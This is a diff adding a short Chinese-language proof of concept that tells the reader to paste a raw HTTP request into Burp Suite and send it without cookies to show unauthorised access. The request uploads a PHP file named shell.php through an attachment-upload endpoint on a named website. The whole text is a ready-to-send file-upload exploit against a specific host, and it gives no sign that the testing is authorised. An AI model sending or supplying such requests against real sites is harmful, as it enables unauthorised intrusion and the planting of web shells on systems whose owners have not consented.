@@ -1,0 +1,15 @@
+把下面整段复制到 Burp Suite → Repeater → Raw 里，点 Send。
+注意：不要带 Cookie，证明未授权。
+
+POST /index.php/attachment/upload/upload/dir/images/module/formguide.html HTTP/1.1
+Host: www.biobasebaby.com
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
+
+------WebKitFormBoundaryABC123
+Content-Disposition: form-data; name="file"; filename="shell.php"
+Content-Type: application/octet-stream
+
+<?php phpinfo(); ?>
+------WebKitFormBoundaryABC123--
